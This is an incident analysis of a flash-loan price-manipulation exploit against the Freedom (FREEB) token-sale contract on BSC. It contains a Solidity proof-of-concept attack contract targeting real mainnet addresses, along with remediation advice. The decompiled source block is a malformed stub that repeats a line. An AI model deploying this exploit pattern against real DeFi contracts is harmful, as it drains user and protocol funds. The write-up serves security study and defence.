# Freedom (FREEB) — Flash Loan-Based buyToken Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-26 |
| **Protocol** | Freedom (FREEB) |
| **Chain** | BSC |
| **Loss** | ~74 WBNB (~$22,000) |
| **Attacker** | [0x835b45d3](https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502) |
| **Attack Contract** | [0x4512abb7](https://bscscan.com/address/0x4512abb79f1f80830f4641caefc5ab33654a2d49) |
| **Vulnerable Contract** | [FREEB 0xae3ada87](https://bscscan.com/address/0xae3ada8787245977832c6dab2d4474d3943527ab) |
| **Root Cause** | The `buyToken()` function uses PancakeSwap pair's `getReserves()` spot reserves as a price oracle, enabling below-market purchases via single-block reserve manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Freedom_exp.sol) |

---

## 1. Vulnerability Overview

The `buyToken()` function in the FREEB contract uses the PancakeSwap pair's spot reserves as its pricing reference. The attacker took out a 500 WBNB flash loan from DODO, manipulated the pool reserves via a WBNB → FREE swap, then called `buyToken()` to purchase FREE tokens at the manipulated price, and subsequently swapped back to capture the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: price calculation based on spot reserves
function buyToken() external payable {
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    // Price derived from spot reserves — manipulable via flash loan
    uint256 price = uint256(reserve1) * 1e18 / uint256(reserve0);
    uint256 tokensOut = msg.value * 1e18 / price;
    FREE.transfer(msg.sender, tokensOut);
}

// ✅ Safe code: TWAP-based price calculation
function buyToken() external payable {
    uint256 price = getTWAPPrice(1800); // Use 30-minute TWAP
    uint256 tokensOut = msg.value * 1e18 / price;
    FREE.transfer(msg.sender, tokensOut);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Freedom_decompiled.sol
contract Freedom {
contract Freedom {
    address public owner;


    // Selector: 0x64d3180d
    function unknown_64d3180d() external {}  // ❌ Vulnerability

    // Selector: 0x587086bd
    function unknown_587086bd() external {}

    // Selector: 0x070d7c69
    function unknown_070d7c69() external {}

    // Selector: 0xa39f25e5
    function unknown_a39f25e5() external {}

    // Selector: 0x4e487b71
    function Panic(uint256 p0) external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO flash loan: 500 WBNB
  │
  ├─→ [2] Large WBNB → FREE swap (PancakeRouter)
  │         └─ Manipulates FREE/WBNB pair reserves
  │
  ├─→ [3] Call buyToken()
  │         └─ Purchases FREE tokens at manipulated reserve-based price
  │
  ├─→ [4] FREE → WBNB reverse swap (profit secured)
  │
  └─→ [5] Repay DODO 500 WBNB + 74 WBNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IFREEB {
    function buyToken() external payable;
}

contract AttackContract {
    IFREEB   constant freeb  = IFREEB(0xae3ada8787245977832c6dab2d4474d3943527ab);
    IERC20   constant FREE   = IERC20(0x8A43Eb772416f934DE3DF8F9Af627359632CB53F);
    IERC20   constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IDODOPool constant dodo  = IDODOPool(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);

    function testExploit() external {
        // [1] DODO flash loan 500 WBNB
        dodo.flashLoan(500 ether, 0, address(this), "");
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [2] WBNB → FREE swap (manipulate pool price)
        swapExactWBNBForFREE(500 ether);

        // [3] Call buyToken — purchase FREE at manipulated price
        freeb.buyToken{value: 0.1 ether}();

        // [4] FREE → WBNB reverse swap
        swapFREEForWBNB(FREE.balanceOf(address(this)));

        // [5] Repay flash loan
        WBNB.transfer(address(dodo), 500 ether);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash Loan-Based Price Manipulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (via flash loan) |
| **DApp Category** | Token Sale / AMM |
| **Impact** | Protocol fund drainage |

## 6. Remediation Recommendations

1. **Introduce TWAP Oracle**: Use a time-weighted average price via Uniswap V3 observation slots
2. **Flash Loan Defense**: Block `buyToken` via an in-transaction flash loan detection flag
3. **Slippage Limits**: Halt function execution if single-block price movement exceeds a threshold
4. **Reserve Validation**: Reject calls when current reserves have changed abnormally relative to the previous block

## 7. Lessons Learned

- Spot reserves of DEX pairs can be manipulated within a single transaction via flash loans.
- Functions with custom price calculation logic such as `buyToken()` and `sell()` are particularly vulnerable to AMM oracle dependence.
- Blocking a single flash loan source can be bypassed, as multiple providers such as DODO and Balancer are available to attackers.